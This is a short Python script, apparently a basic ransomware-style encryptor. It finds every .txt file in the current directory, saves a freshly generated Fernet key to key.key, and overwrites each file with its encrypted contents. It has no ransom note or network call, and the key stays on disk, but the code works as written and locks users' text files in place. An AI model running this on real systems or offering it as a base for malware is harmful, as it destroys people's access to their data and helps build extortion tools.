
from cryptography.fernet import Fernet
import os


# Get the current directory
current_directory = os.getcwd()

# Initialize an empty list to store the filenames
txt_files = []

# Loop through all files in the current directory
for filename in os.listdir(current_directory):
    # Check if the file ends with '.txt'
    if filename.endswith('.txt'):
        # Add the filename to the list
        txt_files.append(filename)

# Print the list of .txt files
print(txt_files)

key = Fernet.generate_key()

with open('key.key', 'wb') as thkey:
    try:  
        thkey.write(key)
        print('Written key successfully')
    except:
        print('Key not written to File')

print("\n\n")

for file in txt_files:
    with open(file, 'rb') as thfile:
        content = thfile.read()
    constent_encrypt = Fernet(key).encrypt(content)

    with open(file, 'wb') as thfile:
        thfile.write(constent_encrypt)



